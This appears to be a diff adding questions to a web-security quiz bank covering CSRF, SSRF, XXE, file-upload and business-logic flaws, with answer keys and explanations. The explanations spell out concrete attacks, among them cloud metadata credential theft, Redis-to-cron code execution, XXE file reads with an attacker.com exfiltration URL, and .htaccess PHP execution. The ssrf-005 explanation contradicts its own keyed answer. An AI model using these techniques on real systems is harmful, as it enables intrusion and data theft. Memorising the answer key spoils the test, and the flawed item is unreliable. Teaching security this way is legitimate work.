+    question: "A developer implements CSRF protection by checking that the `Referer` header matches the application's domain. Under what common condition does this defense fail?"
+    options:
+      - a: "Privacy extensions and some browser settings strip the Referer header entirely — if the server allows requests with no Referer, the protection is bypassed"
+      - b: "The Referer header is spoofable by JavaScript — an attacker can set any value using XMLHttpRequest"
+      - c: "The Referer header is only sent for GET requests, leaving POST requests unprotected"
+      - d: "HTTPS to HTTPS requests never include a Referer header due to security restrictions"
+    answer: "a"
+    explanation: "Many users, privacy tools, and corporate proxies strip Referer headers. If the application falls back to allowing requests without a Referer (to avoid breaking functionality for these users), an attacker can use techniques like `<meta name='referrer' content='no-referrer'>` or certain redirect chains to suppress the Referer, bypassing the check. Option B is wrong — browsers prevent JavaScript from setting the Referer header. Option C is wrong — Referer is sent for POST requests too. Option D is wrong — HTTPS-to-HTTPS requests do include Referer by default."
+
+  # ============================================================
+  # SSRF (6 questions)
+  # ============================================================
+
+  - id: ssrf-001
+    topic: ssrf
+    type: defense-bypass
+    difficulty: advanced
+    question: "A server-side URL fetcher blocks requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x). Which technique MOST reliably bypasses this?"
+    options:
+      - a: "Use DNS rebinding — register a domain that first resolves to a public IP (passing validation) then resolves to 127.0.0.1 (when the actual connection is made)"
+      - b: "Use IPv6 representations of localhost: `http://[::1]/` — many filters only check IPv4 ranges"
+      - c: "Use decimal IP representation: `http://2130706433/` (decimal for 127.0.0.1) — the filter only checks dotted-quad notation"
+      - d: "All of these bypass different implementations of IP-based SSRF filters"
+    answer: "d"
+    explanation: "Each technique bypasses a different weakness in IP filtering. DNS rebinding exploits the gap between DNS resolution for validation and for connection. IPv6 bypass works when filters only check IPv4. Decimal/octal/hex IP representations bypass string-matching filters. Other techniques include: URL redirection (pointing to a public URL that 302-redirects to an internal IP), cloud metadata endpoints (169.254.169.254), and URL parser inconsistencies. Robust SSRF prevention requires checking the resolved IP at connection time, handling all IP formats, and blocking DNS rebinding."
+
+  - id: ssrf-002
+    topic: ssrf
+    type: scenario
+    difficulty: advanced
+    question: "You've found SSRF on an AWS EC2 instance. You can make the server fetch arbitrary URLs. What is the MOST impactful first request?"
+    options:
+      - a: "`http://169.254.169.254/latest/meta-data/iam/security-credentials/` — this reveals the IAM role name, and then you can fetch temporary AWS credentials"
+      - b: "`http://localhost:5432/` — test if PostgreSQL is running locally with no authentication"
+      - c: "`http://169.254.169.254/latest/user-data/` — this often contains initialization scripts with hardcoded credentials"
+      - d: "`http://169.254.169.254/latest/meta-data/public-keys/` — this reveals SSH keys for accessing the instance directly"
+    answer: "a"
+    explanation: "The Instance Metadata Service (IMDS) at 169.254.169.254 is the highest-value SSRF target on AWS. Fetching the IAM security credentials path gives you temporary AWS access keys (Access Key ID, Secret Key, and Session Token) for the instance's IAM role. These credentials often have broad permissions (S3 access, DynamoDB, etc.) and provide access far beyond the single EC2 instance. Option B is useful but limited to the single host. Option C can contain credentials but user-data isn't always present or sensitive. Option D is wrong — public keys are public by definition and don't enable access."
+
+  - id: ssrf-003
+    topic: ssrf
+    type: tricky-concept
+    difficulty: advanced
+    question: "AWS introduced IMDSv2, which requires a PUT request to get a session token before metadata access. How does this mitigate SSRF-based credential theft?"
+    options:
+      - a: "IMDSv2 encrypts all metadata responses, so even if fetched via SSRF, the data is unreadable"
+      - b: "The PUT request requirement blocks most SSRF vectors because common SSRF sinks (img tags, URL fetch libraries in redirect-following mode) only perform GET requests and can't send the required custom header"
+      - c: "IMDSv2 requires the request to originate from the instance's primary network interface, which SSRF can't spoof"
+      - d: "IMDSv2 adds a CAPTCHA to metadata requests that automated SSRF can't solve"
+    answer: "b"
+    explanation: "IMDSv2 requires a PUT request with a custom header (X-aws-ec2-metadata-token-ttl-seconds) to obtain a session token, then a GET request with that token in a header. Most SSRF vulnerabilities involve URL fetchers that only do GET requests and can't set custom headers. Additionally, the token PUT request has a hop-limit of 1 (TTL=1 at the IP level), preventing it from leaving the instance. Option A is wrong — metadata isn't encrypted. Option C isn't quite right — the hop-limit is IP-level, not interface-level. Option D is fabricated."
+
+  - id: ssrf-004
+    topic: ssrf
+    type: defense-bypass
+    difficulty: advanced
+    question: "An SSRF filter validates that the URL hostname resolves to a public IP address before making the request. The server then makes the actual HTTP request to the validated URL. What is this vulnerable to?"
+    options:
+      - a: "DNS rebinding — the hostname resolves to a public IP during validation but to an internal IP during the actual request, exploiting the time gap between DNS lookups"
+      - b: "Nothing — validating the resolved IP is the correct defense against SSRF"
+      - c: "URL encoding bypass — the hostname can be encoded differently for validation vs the HTTP library"
+      - d: "TLS certificate confusion — the server will connect to any IP that presents a valid certificate for the hostname"
+    answer: "a"
+    explanation: "This is a classic TOCTOU (Time-of-Check-Time-of-Use) vulnerability via DNS rebinding. The attacker configures their DNS server to respond with a public IP for the first lookup (validation passes) and an internal IP for the second lookup (the actual HTTP request goes to the internal network). DNS TTL is set to 0 or very low to ensure separate lookups. Option B describes the right idea but misses the rebinding flaw — you must validate the IP at CONNECTION time, not resolution time. Option C is wrong — the URL is the same for both operations. Option D is wrong — TLS certificate validation doesn't affect which IP is connected to."
+
+  - id: ssrf-005
+    topic: ssrf
+    type: scenario
+    difficulty: intermediate
+    question: "An application allows users to import data from a URL. The server validates that the URL scheme is HTTP or HTTPS. On a server running an older version of curl/libcurl as the fetch library, what alternative scheme could bypass this AND enable reading local files?"
+    options:
+      - a: "`gopher://` — this protocol can craft arbitrary TCP packets, enabling interaction with internal services using their native protocols"
+      - b: "`ftp://localhost/etc/passwd` — FTP can read local files and most URL fetchers support FTP"
+      - c: "`file:///etc/passwd` — this scheme reads local files directly without any network request"
+      - d: "The HTTP/HTTPS scheme validation is sufficient — no other schemes can bypass it"
+    answer: "a"
+    explanation: "The question states the scheme is validated to be HTTP or HTTPS, so file:// (Option C) would be blocked. However, the answer asks about bypass given the scheme check. Re-reading: if the check only allows HTTP/HTTPS, gopher:// would also be blocked. The key insight is that HTTP redirects can bypass scheme validation — the server validates the INITIAL URL as HTTPS, but following a redirect to `gopher://` happens after validation. Gopher is particularly dangerous because it can craft raw TCP traffic to interact with Redis, SMTP, and other internal services. Option B: FTP would be blocked by the scheme check. Option D underestimates redirect-based bypasses."
+
+  - id: ssrf-006
+    topic: ssrf
+    type: attack-chain
+    difficulty: advanced
+    question: "You've confirmed SSRF that can reach internal services. Port scanning reveals Redis on 6379 (no authentication). What is the MOST impactful attack using SSRF to interact with Redis?"
+    options:
+      - a: "Use Redis SLAVEOF to replicate data from an external Redis instance you control, injecting malicious data"
+      - b: "Use Redis CONFIG SET and SET commands (via gopher:// or HTTP request smuggling) to write a cron job or SSH key to disk, achieving remote code execution"
+      - c: "Dump all Redis keys to find cached session tokens and API keys"
+      - d: "Use Redis FLUSHALL to delete all cached data, causing a denial of service"
+    answer: "b"
+    explanation: "Redis CONFIG SET allows changing the database dump location (dir) and filename (dbfilename). By writing specially crafted data to Redis and saving it to /var/spool/cron/crontabs/root or /root/.ssh/authorized_keys, you achieve persistent remote code execution. This is a well-known Redis exploitation technique. Option A is creative but more complex and less reliable. Option C provides information but doesn't escalate access as much as code execution. Option D is destructive but far less impactful than gaining code execution."
+
+  # ============================================================
+  # XXE (6 questions)
+  # ============================================================
+
+  - id: xxe-001
+    topic: xxe
+    type: tricky-concept
+    difficulty: advanced
+    question: "A developer disables external entities in the XML parser but does NOT disable DTD processing entirely. What attack is STILL possible?"
+    options:
+      - a: "Billion Laughs (XML bomb) — internal entity expansion can cause exponential memory consumption using nested entity definitions"
+      - b: "External entity injection — disabling 'external entities' is just a label and doesn't actually prevent SYSTEM entity resolution"
+      - c: "XPath injection — DTD processing enables injection into XPath queries embedded in the XML"
+      - d: "XML signature wrapping — DTDs allow redefining the signed content after signature verification"
+    answer: "a"
+    explanation: "The Billion Laughs attack uses only INTERNAL entity definitions (no external resources needed). Entity `a` is defined as 10 repetitions of entity `b`, which is 10 repetitions of entity `c`, and so on. Expanding the top-level entity creates exponential growth — `lol9` expands to a billion `lol` strings, consuming gigabytes of memory. Disabling external entities doesn't prevent this because all entities are internal. Option B is wrong — properly disabling external entities does prevent SYSTEM entity resolution. Option C conflates two unrelated vulnerability classes. Option D describes a different attack against XML signatures."
+
+  - id: xxe-002
+    topic: xxe
+    type: scenario
+    difficulty: advanced
+    question: "You've confirmed XXE in a Java application, but the entity expansion doesn't appear in any HTTP response (blind XXE). How can you extract the contents of /etc/passwd?"
+    options:
+      - a: "Use a parameter entity to load an external DTD from your server that constructs a URL containing the file contents, then triggers an HTTP request to your server with the data embedded in the URL"
+      - b: "Use error-based XXE — define an entity that tries to load a file:// URI containing the target file's contents as the filename, causing an error message that includes the data"
+      - c: "Use FTP-based exfiltration — define an entity that connects to your FTP server and sends the file contents as the login username"
+      - d: "All three are valid blind XXE extraction techniques"
+    answer: "d"
+    explanation: "All three are established blind XXE techniques. Option A (OOB via HTTP): The external DTD defines a parameter entity using the file:// protocol, then constructs a URL like `http://attacker.com/?data=FILE_CONTENTS`. Option B (error-based): Triggering a parsing error that includes the file contents in the error message. Option C (FTP exfiltration): FTP is useful because it can exfiltrate multi-line file contents that would break HTTP URLs. Each technique has tradeoffs — HTTP is simplest, FTP handles newlines, error-based doesn't require outbound connections."
+
+  - id: xxe-003
+    topic: xxe
+    type: defense-bypass
+    difficulty: advanced
+    question: "An application doesn't accept XML input directly, but it processes DOCX file uploads. How can XXE still be exploited?"
+    options:
+      - a: "DOCX files are ZIP archives containing XML files — injecting XXE payloads into the internal XML documents (like word/document.xml) can trigger XXE when the server parses them"
+      - b: "DOCX files contain embedded macros that can execute XXE payloads when the server opens them"
+      - c: "The DOCX file extension can be renamed to .xml and the server will process it as raw XML"
+      - d: "DOCX files contain a manifest.xml that the server reads before any security filtering, allowing XXE in the manifest"
+    answer: "a"
+    explanation: "DOCX (and XLSX, PPTX, ODT) files are ZIP archives containing multiple XML files. If the server-side library parses these XML files without disabling external entities, XXE payloads embedded in any of the internal XML documents will be processed. This is a commonly overlooked XXE vector because developers don't think of document uploads as XML input. Option B confuses XXE with macro-based attacks — they're different vulnerability classes. Option C is wrong — the server uses the Content-Type/magic bytes, not just the extension. Option D fabricates a specific manifest behavior."
+
+  - id: xxe-004
+    topic: xxe
+    type: tricky-concept
+    difficulty: advanced
+    question: "Why can't you directly use an external entity to read a PHP file (like `/var/www/index.php`) via XXE and have its full contents reflected in the response?"
+    options:
+      - a: "PHP files are executable, and the XML parser executes them instead of reading their contents"
+      - b: "PHP files contain angle brackets (<, >) and other characters that are invalid in XML entity values, causing the XML parser to throw an error when expanding the entity"
+      - c: "PHP files are binary and XML entities can only contain text content"
+      - d: "The web server blocks direct file:// access to PHP files to prevent source code disclosure"
+    answer: "b"
+    explanation: "XML has strict parsing rules. When a file containing `<?php` or `<html>` is expanded as an entity value, the XML parser treats the `<` as the start of a new XML element, breaking the XML structure and causing a parse error. This is why blind XXE + OOB exfiltration (base64-encoding the file via PHP filters or using CDATA wrapping via parameter entities) is needed for files with XML-special characters. Option A is wrong — the XML parser reads files, it doesn't execute them. Option C is wrong — PHP files are text. Option D is wrong — file:// access is OS-level, not web-server-level."
+
+  - id: xxe-005
+    topic: xxe
+    type: spot-the-vuln
+    difficulty: intermediate
+    question: "Consider this Python code that parses user-uploaded SVG files:\n```python\nfrom lxml import etree\ntree = etree.parse(uploaded_file)\n```\nWhat vulnerability exists and why?"
+    options:
+      - a: "XXE — lxml's etree.parse() processes external entities and DTDs by default, and SVG files are XML that can contain DTD declarations"
+      - b: "XSS — the SVG might contain JavaScript that executes when the parsed result is served back to users"
+      - c: "Path traversal — the SVG's xlink:href attributes can reference local files"
+      - d: "SSRF — the SVG's image references can point to internal network resources"
+    answer: "a"
+    explanation: "lxml's default parser resolves external entities and processes DTDs. Since SVG is an XML format, an attacker can embed a malicious DTD in the SVG file: `<!DOCTYPE svg [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>` and reference `&xxe;` in the SVG content. The fix is `etree.parse(uploaded_file, etree.XMLParser(resolve_entities=False, no_network=True))`. Option B is a valid concern for SVG serving but not related to XML parsing. Option C is a concern when rendering SVGs, not during XML parsing. Option D is also a rendering concern, not a parsing vulnerability."
+
+  - id: xxe-006
+    topic: xxe
+    type: defense-bypass
+    difficulty: advanced
+    question: "A developer configures their XML parser to block SYSTEM entities (external file/URL references). They believe this prevents all XXE. What entity type can STILL be used for attacks?"
+    options:
+      - a: "Parameter entities (defined with % in the DTD) — these are processed differently and may not be blocked by the same setting that blocks general entities"
+      - b: "Predefined entities (&amp;, &lt;, etc.) — these can be redefined to point to external resources"
+      - c: "Character entities (&#x41;) — these can be chained to construct file:// URIs"
+      - d: "Namespace entities — XML namespaces can reference external DTDs that bypass the parser's restrictions"
+    answer: "a"
+    explanation: "Parameter entities (% entities) are processed within the DTD itself and are sometimes handled by a different code path than general entities. Some parser configurations that disable external general entities still allow external parameter entities. For example, `<!ENTITY % file SYSTEM 'file:///etc/passwd'>` may still work. This is particularly relevant for blind XXE, where parameter entities in an external DTD are used for data exfiltration. Option B is wrong — predefined entities can't be redefined to reference external resources. Option C is wrong — character references are simple character mappings. Option D fabricates a non-existent entity type."
+
+  # ============================================================
+  # FILE UPLOAD (6 questions)
+  # ============================================================
+
+  - id: upload-001
+    topic: file-upload
+    type: defense-bypass
+    difficulty: advanced
+    question: "A file upload feature validates by checking the Content-Type header, the file extension, and the first few bytes (magic number) for image formats. Which technique bypasses ALL THREE checks?"
+    options:
+      - a: "Upload a polyglot file — a valid JPEG (with correct magic bytes FF D8 FF) that also contains embedded PHP code in a comment section, with a .jpg extension and image/jpeg Content-Type"
+      - b: "Rename a PHP file to .jpg — the extension and Content-Type match, and PHP files start with `<?` which is a valid image header"
+      - c: "Upload a PHP file with `GIF89a` prepended — this matches the GIF magic bytes, use .gif extension and image/gif Content-Type"
+      - d: "Both A and C — polyglot files and magic byte prepending are both valid techniques that bypass triple validation"
+    answer: "d"
+    explanation: "Both techniques create files that pass all three validation checks. A JPEG polyglot embeds PHP in the EXIF/comment sections of a genuine JPEG. Prepending `GIF89a` to a PHP file creates a file that starts with valid GIF magic bytes. Both use matching extensions and Content-Types. The vulnerability occurs when the web server later interprets these files as PHP (due to misconfiguration or path tricks). Option B is wrong — `<?` is NOT a valid image magic number; image validators check specific byte sequences."
+
+  - id: upload-002
+    topic: file-upload
+    type: scenario
+    difficulty: advanced
+    question: "An application stores uploaded files outside the web root and serves them through a download endpoint that sets `Content-Type: application/octet-stream` and `Content-Disposition: attachment`. Is file upload exploitation still possible?"
+    options:
+      - a: "No — this is the ideal secure configuration; files can't be executed or rendered in the browser"
+      - b: "Yes — if the application has a separate image rendering endpoint that reads the stored file and serves it inline for preview functionality"
+      - c: "Yes — browsers ignore Content-Disposition on some file types and render them inline regardless"
+      - d: "Yes — the Content-Type can be overridden by the browser based on file extension sniffing"
+    answer: "b"
+    explanation: "The base configuration is strong, but applications often have additional features (image thumbnails, document preview, avatar display) that serve the same uploaded files with different headers — potentially inline with a Content-Type derived from the file. These secondary serving paths can re-introduce execution/rendering risks. Option A would be correct if this were the ONLY serving path. Option C is wrong — browsers respect Content-Disposition: attachment for downloads. Option D is wrong — browsers don't sniff Content-Type when explicit headers are set (especially with X-Content-Type-Options: nosniff)."
+
+  - id: upload-003
+    topic: file-upload
+    type: defense-bypass
+    difficulty: advanced
+    question: "An Apache web server allows file uploads. The application blocks .php, .php3, .php5, .phtml, and .phar extensions. What upload can STILL achieve PHP execution?"
+    options:
+      - a: "Upload a .htaccess file containing `AddType application/x-httpd-php .txt` — this makes Apache execute .txt files as PHP in that directory"
+      - b: "Upload with the extension .PHP (uppercase) — Apache extension matching is case-sensitive on Linux"
+      - c: "Upload with a double extension: `shell.php.jpg` — Apache executes the first recognized extension"
+      - d: "Upload a .pHP file — PHP's extension handling is case-insensitive even though the filesystem isn't"
+    answer: "a"
+    explanation: "Uploading a .htaccess file is devastating — it reconfigures Apache for that directory. `AddType application/x-httpd-php .txt` makes Apache pass .txt files to the PHP interpreter, so a previously-uploaded innocent.txt containing PHP code now executes. Option B is wrong — while Linux filesystems are case-sensitive, Apache's handler mapping for PHP is typically case-insensitive in modern configurations. Option C is wrong — Apache uses the LAST extension, not the first, for handler selection. Option D is wrong for the same reason as B."
+
+  - id: upload-004
+    topic: file-upload
+    type: tricky-concept
+    difficulty: advanced
+    question: "A web application resizes uploaded images using ImageMagick before storing them. The developer believes this neutralizes any embedded malicious content. What are they missing?"
+    options:
+      - a: "ImageMagick has a history of critical RCE vulnerabilities (ImageTragick/CVE-2016-3714) where specially crafted images trigger command execution during processing"
+      - b: "Image resizing preserves EXIF metadata, which can contain executable JavaScript that runs when the image is viewed"
+      - c: "The resized image's pixel data can encode a PHP webshell that survives the transformation"
+      - d: "Resizing temporarily creates the original file on disk, and a race condition allows accessing it before it's replaced"
+    answer: "a"
+    explanation: "ImageMagick's ImageTragick vulnerability (and similar bugs) allow remote code execution through specially crafted image files. ImageMagick supports many file formats and uses external delegates (like ffmpeg, ghostscript) to process them. Malicious SVG, MVG, or other format files can trigger command execution during the resize operation — before any sanitization occurs. Option B is wrong — EXIF JavaScript doesn't execute in modern browsers (it's not an execution context). Option C is theoretically possible but extremely unlikely to survive resampling. Option D is possible but the primary risk is RCE during processing, not a race condition."
+
+  - id: upload-005
+    topic: file-upload
+    type: scenario
+    difficulty: intermediate
+    question: "An application checks file uploads by: 1) verifying the extension is .png, 2) verifying Content-Type is image/png, 3) using the `file` command to verify the file type. An attacker uploads a file named `test.png` that passes all checks. Two hours later, a web shell appears on the server. How?"
+    options:
+      - a: "The PNG contained steganographic data that another server process decoded into a PHP file"
+      - b: "A separate Local File Inclusion (LFI) vulnerability on the server includes the PNG file as PHP — the PHP interpreter ignores the PNG header and executes any PHP code embedded in the file"
+      - c: "The attacker exploited a race condition between upload and validation — the unvalidated file was accessible for a brief window"
+      - d: "The PNG's EXIF data contained a cron job specification that the server's monitoring tool parsed and executed"
+    answer: "b"
+    explanation: "PHP is remarkably tolerant of non-PHP content before `<?php` tags. An LFI vulnerability that includes arbitrary files as PHP (`include('/uploads/test.png')`) will execute any PHP code embedded in the PNG, ignoring the binary image data. The file genuinely is a valid PNG (passing all checks) that also contains PHP code in a comment or metadata section. Option A is overly complex and unlikely. Option C doesn't explain the 2-hour delay. Option D fabricates a behavior that standard monitoring tools don't have."
+
+  - id: upload-006
+    topic: file-upload
+    type: attack-chain
+    difficulty: advanced
+    question: "You can upload files to a server, but the upload directory has been configured with PHP execution disabled (via .htaccess or nginx config). All direct execution vectors are blocked. What is the MOST effective remaining attack?"
+    options:
+      - a: "Upload an SVG file containing JavaScript — if the server serves SVGs with their correct MIME type, the JS executes in viewers' browsers (stored XSS)"
+      - b: "Upload a file larger than the disk quota to cause a denial of service"
+      - c: "Upload a file with a very long name to cause a buffer overflow in the filesystem"
+      - d: "Upload a ZIP bomb — a small file that expands to massive size if the server attempts to extract it"
+    answer: "a"
+    explanation: "Even without server-side code execution, uploaded SVG files containing `<script>alert(document.cookie)</script>` create stored XSS if served with `Content-Type: image/svg+xml`. Any user who views the SVG (e.g., as an avatar or attached image) executes the JavaScript in their browser. Option B is possible but lower impact and easily mitigated by file size limits. Option C doesn't cause buffer overflows in modern filesystems. Option D is real but requires the server to extract the archive, which isn't guaranteed."
+
+  # ============================================================
+  # BUSINESS LOGIC (6 questions)
+  # ============================================================
+
+  - id: logic-001
+    topic: business-logic
+    type: scenario
+    difficulty: advanced
+    question: "An e-commerce site applies discount coupons using this flow: add items to cart, apply coupon code, proceed to checkout, pay. The coupon reduces the total by 20%. A race condition is suspected. What specific exploit achieves the most benefit?"
+    options:
+      - a: "Apply the same coupon multiple times concurrently — if the 'coupon already used' check is not atomic, multiple discount applications can succeed before the flag is set"
+      - b: "Add items to the cart concurrently from two sessions — the cart total calculation will be confused"
+      - c: "Start checkout in two browser tabs simultaneously — both might create separate orders for the same cart"
+      - d: "Apply the coupon and immediately remove items from the cart — the discount persists on the reduced total"
+    answer: "a"
+    explanation: "The classic coupon race condition: sending multiple concurrent 'apply coupon' requests can succeed before the database marks the coupon as used. If the check-then-mark isn't atomic (using a database transaction with proper isolation), multiple requests pass the 'coupon unused' check simultaneously, each applying the 20% discount. With enough concurrent requests, the total could be reduced to nearly zero. Option B is unlikely to cause calculation errors in properly-designed cart systems. Option C is possible but typically results in duplicate charges, not discounts. Option D describes a logic flaw, not a race condition."
+
+  - id: logic-002
+    topic: business-logic
+    type: defense-bypass
+    difficulty: intermediate
+    question: "An online store validates that quantity values are positive integers. A tester enters -5 for quantity and the total becomes negative, resulting in a 'refund' on checkout. The developer adds a check: `if quantity < 1: reject`. What edge case STILL works?"
+    options:
+      - a: "Decimal values like 0.001 — the quantity passes the `< 1` check but might be rounded down to 0 during price calculation, or exploited for rounding errors"
+      - b: "Very large quantities like 99999999 — this causes an integer overflow that wraps to a negative total"
+      - c: "The string 'NaN' — JavaScript comparisons with NaN are always false, so `NaN < 1` is false and bypasses the check"
+      - d: "All of the above exploit different type handling weaknesses in the same validation logic"
+    answer: "d"
+    explanation: "All three exploit weak type validation. Decimals (0.001) might be accepted but cause rounding issues in financial calculations. Integer overflow (99999999 * price) can wrap to negative in languages with fixed-width integers. NaN bypasses numeric comparisons because NaN is not less than, equal to, or greater than any value. The robust fix is strict type validation (must be integer), range validation (reasonable min AND max), and server-side recalculation of all totals."
+
+  - id: logic-003
+    topic: business-logic
+    type: tricky-concept
+    difficulty: advanced
+    question: "A money transfer feature deducts from the sender and adds to the recipient in two separate database operations (not a transaction). An attacker times a request to trigger a failure between the deduction and the addition. What happens?"
+    options:
+      - a: "The sender's balance is deducted but the recipient never receives the funds — the money disappears from the system"
+      - b: "The system automatically rolls back both operations because databases always maintain consistency"
+      - c: "The recipient receives the money twice because the retry logic runs the addition again"
+      - d: "Both balances remain unchanged because the application catches the error and reverses the deduction"
+    answer: "a"
+    explanation: "Without a database transaction wrapping both operations, a failure between the deduction and the addition leaves the system in an inconsistent state: money is removed from the sender but never added to the recipient. Option B describes transactional behavior which the question explicitly states is NOT used. Option C depends on the retry logic implementation — and poorly-designed retry logic could indeed cause double-crediting, but the question asks about the failure itself. Option D assumes perfect error handling which contradicts the premise that these are separate non-transactional operations."
+
+  - id: logic-004
+    topic: business-logic
+    type: scenario
+    difficulty: advanced
+    question: "A gift card system allows purchasing a $100 card and sending it to any email. The card can be redeemed for store credit. An attacker buys a gift card, sends it to themselves, redeems it, then initiates a chargeback on the original purchase. What is the business logic flaw?"
+    options:
+      - a: "The gift card value should be revoked when a chargeback is filed — the system doesn't link chargebacks to redeemed gift cards"
+      - b: "Gift cards should require the recipient to verify their identity before redemption"
+      - c: "The chargeback will fail because the credit card company can see the gift card was legitimately purchased"
+      - d: "The system should require a waiting period between purchase and redemption to allow chargeback processing"
+    answer: "a"
+    explanation: "The core flaw is that the gift card system and the payment system are disconnected. When a chargeback occurs, the payment is reversed but the gift card credit remains in the attacker's account — they essentially got free store credit. The fix requires linking gift card redemptions to the original payment and automatically revoking card value when chargebacks are filed. Option B adds friction but doesn't prevent the self-send attack. Option C is wrong — chargebacks are often granted regardless. Option D adds delay but doesn't prevent the eventual exploit."
+
+  - id: logic-005
+    topic: business-logic
+    type: spot-the-vuln
+    difficulty: intermediate
+    question: "A hotel booking system shows: Room rate $200/night, 3-night minimum. The API accepts this JSON:\n```json\n{\"room_id\": 5, \"check_in\": \"2025-03-01\", \"check_out\": \"2025-03-04\", \"rate\": 200}\n```\nWhat is the business logic vulnerability?"
+    options:
+      - a: "The client sends the rate — an attacker can change `rate` to 1, paying $3 instead of $600 for a 3-night stay"
+      - b: "The dates aren't validated — an attacker could set check_out before check_in for a negative-duration stay"
+      - c: "The room_id is directly accessible — an attacker could book any room regardless of availability"
+      - d: "All three are business logic vulnerabilities in this API design"
+    answer: "d"
+    explanation: "All three represent classic business logic flaws. Option A (price manipulation): The server should NEVER trust client-supplied pricing — the rate should be calculated server-side from the room and date. Option B (date logic): Negative or zero duration stays could result in refunds or free stays. Option C (IDOR): The room_id should be validated against availability and authorization. Each flaw is individually exploitable and together they represent a thoroughly insecure booking API."
+
+  - id: logic-006
+    topic: business-logic
+    type: attack-chain
+    difficulty: advanced
+    question: "A cryptocurrency exchange allows trading between BTC, ETH, and USD with prices displayed to 8 decimal places. The exchange truncates (not rounds) calculations at 2 decimal places for USD amounts. An attacker makes thousands of tiny trades. What are they exploiting?"
+    options:
+      - a: "Rounding/truncation arbitrage — each trade loses a fraction of a cent from the exchange due to truncation, and the attacker can accumulate these fractions across thousands of trades"
+      - b: "The attacker is performing wash trading to inflate their trading volume and earn loyalty tier benefits"
+      - c: "High-frequency trading to front-run other users' orders using the exchange's API latency"
+      - d: "The tiny trades overwhelm the exchange's order-matching engine, causing it to crash and enabling exploitation during recovery"
+    answer: "a"
+    explanation: "Currency rounding/truncation exploitation (also known as salami slicing) accumulates tiny rounding differences across many transactions. For example, if 0.00001 BTC costs $0.009 but truncation makes it $0.00, the attacker gets free fractions of BTC on each trade. Over thousands of trades, these fractions add up to significant value. The fix is to use exact arithmetic (no truncation during calculation) and apply rounding only on final settlement, or to set minimum trade values above the truncation threshold. Option B describes a different market manipulation tactic. Option C describes front-running which is latency-based. Option D describes a DoS attack."
